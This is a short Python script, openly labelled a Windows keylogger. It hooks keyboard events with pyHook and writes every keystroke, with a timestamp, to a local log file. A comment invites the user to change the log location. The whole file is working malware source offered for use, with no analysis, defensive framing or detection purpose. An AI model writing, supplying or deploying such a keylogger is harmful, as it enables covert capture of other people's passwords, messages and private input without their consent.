# Python code for keylogger 
# to be used in windows 
import pyHook, pythoncom, sys, logging
# feel free to set the file_log to a different file name/location
file_log = 'D:\keylog1.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
